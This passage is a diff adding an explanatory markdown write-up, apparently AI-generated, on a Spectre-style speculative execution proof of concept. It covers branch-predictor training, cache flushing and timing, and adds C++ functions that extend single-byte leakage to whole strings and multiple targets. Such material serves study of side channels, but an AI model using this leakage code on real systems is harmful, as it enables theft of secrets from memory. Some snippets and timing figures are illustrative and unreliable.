@@ -948,3 +948,492 @@ size_t FindOptimalDepth() {
 The **exact cutoff at depth 14** strongly indicates your CPU has a **16-entry RSB** with approximately 2 entries already in use by the call stack. This is consistent with common Intel CPU architectures. The attack fails completely at depth 15+ because RSB overflow triggers fallback prediction mechanisms that cannot reliably predict the recursive call pattern, causing speculation to follow wrong paths that don’t access the secret data.
 
 This is actually **normal behavior** and demonstrates the attack working as designed within the hardware constraints of your specific CPU’s microarchitecture.​​​​​​​​​​​​​​​​
+
+
+# Detailed Analysis of Spectre Attack Components
+
+## 1. `kAccessorArrayLength` Variable Analysis
+
+### What is it?
+
+```cpp
+constexpr size_t kAccessorArrayLength = 1024;
+```
+
+**Definition:** A compile-time constant defining the size of the pointer array used for branch predictor training.
+
+### What does it do?
+
+**Primary Purpose:** Controls the **training intensity** for the indirect branch predictor.
+
+```cpp
+auto array_of_pointers = 
+    std::unique_ptr<std::array<DataAccessor *, kAccessorArrayLength>>(
+        new std::array<DataAccessor *, kAccessorArrayLength>());
+```
+
+**Creates:** An array of 1024 function pointers for virtual function call training.
+
+### How is it used?
+
+#### Training Phase Pattern:
+
+```cpp
+// Fill 1023 pointers with "good" accessor
+for (auto &pointer : *array_of_pointers) {
+    pointer = real_data_accessor.get();  // Train predictor
+}
+
+// Inject 1 "bad" accessor to cause misprediction
+size_t local_pointer_index = run % kAccessorArrayLength;
+(*array_of_pointers)[local_pointer_index] = censoring_data_accessor.get();
+```
+
+#### Training Loop Execution:
+
+```cpp
+for (size_t i = 0; i <= local_pointer_index; ++i) {
+    DataAccessor *accessor = (*array_of_pointers)[i];
+    // Virtual function call - trains branch predictor
+    accessor->GetDataByte(offset, read_private_data);
+}
+```
+
+### Why 1024 Specifically?
+
+**Branch Predictor Training Requirements:**
+
+- **Training Ratio**: 1023:1 (good:bad predictions)
+- **BTB Saturation**: Fills Branch Target Buffer with consistent pattern
+- **Statistical Significance**: Large enough sample for reliable misprediction
+- **Performance Balance**: Not too large to cause excessive overhead
+
+**Microarchitectural Impact:**
+
+```
+Training Effectiveness:
+- 1023 correct predictions → high confidence in BTB
+- 1 incorrect prediction → guaranteed misprediction
+- Training ratio: 99.9% → very strong prediction bias
+```
+
+**Alternative Sizes Analysis:**
+
+- **64 entries**: May not provide enough training (63:1 ratio)
+- **256 entries**: Good balance, faster execution (255:1 ratio)
+- **1024 entries**: Strong training, current choice (1023:1 ratio)
+- **4096 entries**: Overkill, slower execution, may cause BTB pollution
+
+-----
+
+## 2. Cache Interaction Mechanisms
+
+### How Code Gets Data To/From Cache
+
+#### Cache Line Structure
+
+```cpp
+// BigByte is designed to fill entire cache line
+struct BigByte {
+    uint8_t value;
+    uint8_t padding[63];  // Total: 64 bytes = 1 cache line
+};
+```
+
+#### Oracle Array Setup
+
+```cpp
+std::array<BigByte, 256> oracle;  // 256 cache lines, one per possible byte value
+```
+
+**Memory Layout:**
+
+```
+Cache Line 0:  oracle[0]   (64 bytes) - represents byte value 0x00
+Cache Line 1:  oracle[1]   (64 bytes) - represents byte value 0x01
+Cache Line 2:  oracle[2]   (64 bytes) - represents byte value 0x02
+...
+Cache Line 255: oracle[255] (64 bytes) - represents byte value 0xFF
+```
+
+### Cache Operations in Attack
+
+#### 1. Cache Flushing (`FlushOracle`)
+
+```cpp
+void FlushOracle() {
+    for (auto &big_byte : oracle) {
+        FlushFromDataCache(&big_byte, &big_byte + 1);
+    }
+}
+```
+
+**Purpose:** Remove all oracle entries from cache hierarchy
+**Result:** All 256 cache lines evicted from L1/L2/L3 caches
+
+#### 2. Speculative Cache Loading
+
+```cpp
+// During speculative execution:
+char secret_byte = accessor->GetDataByte(offset, true);  // Gets secret value
+ForceRead(oracle.data() + static_cast<size_t>(secret_byte));
+```
+
+**What Happens:**
+
+1. `secret_byte` contains leaked value (e.g., 0x73 = ‘s’)
+1. `oracle.data() + 0x73` points to `oracle[115]`
+1. `ForceRead()` loads `oracle[115]` into cache
+1. Even after misprediction rollback, `oracle[115]` remains cached
+
+#### 3. Cache Timing Measurement
+
+```cpp
+std::pair<bool, char> RecomputeScores(char public_byte) {
+    for (size_t i = 0; i < 256; ++i) {
+        // Measure access time to each oracle entry
+        auto start = high_resolution_clock::now();
+        ForceRead(&oracle[i]);
+        auto end = high_resolution_clock::now();
+        
+        timing[i] = duration_cast<nanoseconds>(end - start).count();
+    }
+    
+    // Find fastest access (cache hit)
+    size_t fastest_index = find_min_element(timing);
+    return {confidence_check(), static_cast<char>(fastest_index)};
+}
+```
+
+### Cache Page Relationship
+
+**Cache Hierarchy Interaction:**
+
+```
+L1 Cache (32KB typical):
+├── oracle[0-127] → May fit in L1
+└── oracle[128-255] → Evicted to L2
+
+L2 Cache (256KB typical):
+├── Full oracle array fits
+└── Other program data
+
+L3 Cache (8MB typical):
+├── Oracle array + surrounding memory
+└── Shared across CPU cores
+```
+
+**Attack Timing Characteristics:**
+
+- **L1 Hit**: ~1-2 nanoseconds (cache hit on secret oracle entry)
+- **L2 Hit**: ~10-15 nanoseconds
+- **L3 Hit**: ~30-50 nanoseconds
+- **Memory Miss**: ~200-300 nanoseconds (all other oracle entries)
+
+-----
+
+## 3. Extending to Full String Leakage
+
+### Current Single Character Implementation
+
+```cpp
+static char LeakByte(size_t offset) {
+    // Leaks private_data[offset]
+    // Returns single character
+}
+```
+
+### Full String Leakage Extension
+
+#### Method 1: Sequential Character Leakage
+
+```cpp
+std::string LeakFullString(size_t max_length = 256) {
+    std::string leaked_string;
+    leaked_string.reserve(max_length);
+    
+    for (size_t offset = 0; offset < max_length; ++offset) {
+        char leaked_char = LeakByteVariableDepth(offset, g_branch_prediction_depth);
+        
+        // Stop at null terminator
+        if (leaked_char == '\0') {
+            break;
+        }
+        
+        leaked_string.push_back(leaked_char);
+        
+        // Progress indicator
+        std::cout << "Leaked: " << leaked_string << std::endl;
+    }
+    
+    return leaked_string;
+}
+```
+
+#### Method 2: Parallel Character Leakage
+
+```cpp
+std::string LeakStringParallel(size_t string_length) {
+    std::vector<char> leaked_chars(string_length);
+    std::vector<std::thread> threads;
+    
+    // Launch thread per character position
+    for (size_t i = 0; i < string_length; ++i) {
+        threads.emplace_back([&leaked_chars, i]() {
+            leaked_chars[i] = LeakByteVariableDepth(i, g_branch_prediction_depth);
+        });
+    }
+    
+    // Wait for all threads
+    for (auto &thread : threads) {
+        thread.join();
+    }
+    
+    return std::string(leaked_chars.begin(), leaked_chars.end());
+}
+```
+
+#### Method 3: Adaptive Length Detection
+
+```cpp
+std::string LeakStringAdaptive() {
+    std::string result;
+    size_t offset = 0;
+    const size_t MAX_STRING_LENGTH = 1024;
+    
+    while (offset < MAX_STRING_LENGTH) {
+        char leaked_char = LeakByteVariableDepth(offset, g_branch_prediction_depth);
+        
+        // Handle common string terminators
+        if (leaked_char == '\0' || leaked_char == '\n' || leaked_char == '\r') {
+            break;
+        }
+        
+        // Validate printable characters
+        if (std::isprint(leaked_char) || std::isspace(leaked_char)) {
+            result.push_back(leaked_char);
+        } else {
+            // Handle binary data or encoding issues
+            result.append("\\x");
+            result.append(to_hex_string(static_cast<uint8_t>(leaked_char)));
+        }
+        
+        offset++;
+        
+        // Dynamic progress reporting
+        if (offset % 10 == 0) {
+            std::cout << "Progress: " << offset << " bytes leaked" << std::endl;
+        }
+    }
+    
+    return result;
+}
+```
+
+#### Method 4: Multi-Target String Leakage
+
+```cpp
+struct StringTarget {
+    const char* address;
+    size_t max_length;
+    std::string name;
+};
+
+std::map<std::string, std::string> LeakMultipleStrings(
+    const std::vector<StringTarget>& targets) {
+    
+    std::map<std::string, std::string> results;
+    
+    for (const auto& target : targets) {
+        std::cout << "Leaking: " << target.name << std::endl;
+        
+        // Temporarily update global pointer for this target
+        const char* original_private = private_data;
+        private_data = target.address;
+        
+        // Leak the string
+        std::string leaked = LeakStringAdaptive();
+        results[target.name] = leaked;
+        
+        // Restore original pointer
+        private_data = original_private;
+        
+        std::cout << target.name << ": " << leaked << std::endl;
+    }
+    
+    return results;
+}
+```
+
+-----
+
+## 4. Secret Detection in Cache - Detailed Mechanism
+
+### Cache Side-Channel Detection Process
+
+#### Step 1: Oracle Preparation
+
+```cpp
+// Each oracle entry occupies exactly one cache line
+std::array<BigByte, 256> oracle;
+
+// Before attack: flush all oracle entries
+for (size_t i = 0; i < 256; ++i) {
+    FlushFromDataCache(&oracle[i], &oracle[i] + 1);
+}
+// Result: All oracle[0-255] are NOT in cache
+```
+
+#### Step 2: Speculative Secret Access
+
+```cpp
+// During mispredicted speculation:
+char secret_value = private_data[offset];  // e.g., secret_value = 0x73 ('s')
+
+// Use secret as array index:
+ForceRead(oracle.data() + static_cast<size_t>(secret_value));
+// This loads oracle[0x73] into cache line
+```
+
+**Microarchitectural Events:**
+
+```mermaid
+sequenceDiagram
+    participant CPU as CPU Core
+    participant L1 as L1 Cache
+    participant L2 as L2 Cache  
+    participant Mem as Main Memory
+    
+    CPU->>L1: Request oracle[0x73]
+    L1->>CPU: Cache Miss
+    CPU->>L2: Request oracle[0x73]
+    L2->>CPU: Cache Miss
+    CPU->>Mem: Load oracle[0x73]
+    Mem->>L2: Cache line data
+    L2->>L1: Cache line data
+    L1->>CPU: oracle[0x73] available
+    Note over CPU: Misprediction detected!
+    Note over CPU: Rollback architectural state
+    Note over L1,L2: Cache state PRESERVED
+```
+
+#### Step 3: Cache Timing Measurement
+
+```cpp
+std::vector<uint64_t> access_times(256);
+
+for (size_t i = 0; i < 256; ++i) {
+    // Measure access time to oracle[i]
+    uint64_t start = __rdtsc();  // Read timestamp counter
+    volatile char dummy = oracle[i].value;  // Force memory access
+    uint64_t end = __rdtsc();
+    
+    access_times[i] = end - start;
+}
+```
+
+**Timing Pattern Analysis:**
+
+```cpp
+// Expected timing results:
+access_times[0x00] = 400 cycles   // Cache miss (memory access)
+access_times[0x01] = 380 cycles   // Cache miss
+access_times[0x02] = 420 cycles   // Cache miss
+// ...
+access_times[0x73] = 45 cycles    // CACHE HIT! (secret value)
+// ...
+access_times[0xFF] = 390 cycles   // Cache miss
+```
+
+#### Step 4: Statistical Analysis and Confidence
+
+```cpp
+std::pair<bool, char> RecomputeScores(char public_byte_value) {
+    // Find minimum access time
+    auto min_iter = std::min_element(access_times.begin(), access_times.end());
+    size_t fastest_index = std::distance(access_times.begin(), min_iter);
+    uint64_t fastest_time = *min_iter;
+    
+    // Calculate confidence metrics
+    uint64_t second_fastest = find_second_minimum(access_times);
+    uint64_t timing_gap = second_fastest - fastest_time;
+    
+    // Exclude public data false positive
+    if (fastest_index == static_cast<size_t>(public_byte_value)) {
+        // This could be noise, find next fastest
+        fastest_index = find_second_fastest_excluding(public_byte_value);
+    }
+    
+    // Confidence threshold
+    bool confident = (timing_gap > THRESHOLD) && 
+                    (fastest_time < CACHE_HIT_THRESHOLD);
+    
+    return {confident, static_cast<char>(fastest_index)};
+}
+```
+
+### Why Cache Detection Works
+
+#### Cache Persistence Through Speculation
+
+```cpp
+// Key insight: Cache state survives misprediction recovery
+// 
+// Architectural state:  ROLLED BACK (no secret access visible)
+// Microarchitectural:   PRESERVED (cache line remains)
+//
+// This creates a covert channel:
+// secret_value → cache_line_index → timing_measurement → leaked_byte
+```
+
+#### Noise Filtering Techniques
+
+```cpp
+// Multiple measurements for confidence
+const int MEASUREMENT_ROUNDS = 5;
+std::vector<size_t> candidates;
+
+for (int round = 0; round < MEASUREMENT_ROUNDS; ++round) {
+    size_t candidate = perform_timing_measurement();
+    candidates.push_back(candidate);
+}
+
+// Statistical analysis
+std::map<size_t, int> frequency;
+for (size_t candidate : candidates) {
+    frequency[candidate]++;
+}
+
+// Find most frequent result
+auto most_frequent = std::max_element(frequency.begin(), frequency.end(),
+    [](const auto& a, const auto& b) { return a.second < b.second; });
+
+if (most_frequent->second >= CONFIDENCE_THRESHOLD) {
+    return most_frequent->first;  // High confidence result
+}
+```
+
+### Attack Success Conditions
+
+#### Required Timing Resolution
+
+```cpp
+// Successful attack needs:
+// 1. Cache hit:  < 100 CPU cycles
+// 2. Cache miss: > 200 CPU cycles  
+// 3. Timing gap: > 100 cycles difference
+// 4. Measurement noise: < 50 cycles standard deviation
+```
+
+#### Environmental Factors
+
+```cpp
+// Factors affecting success:
+// 1. CPU frequency scaling (affects timing)
+// 2. System load (cache contention)
+// 3. Hardware prefetching (false positives)
+// 4. Hyperthreading (cache sharing)
+// 5. Operating system noise (interrupts)
+```
+
+The cache side-channel works because **speculative execution has microarchitectural side effects** that persist even after the speculation is architecturally rolled back. The secret value becomes the “key” that unlocks one specific cache line out of 256 possibilities, creating a detectable timing signature that reveals the secret data.​​​​​​​​​​​​​​​​
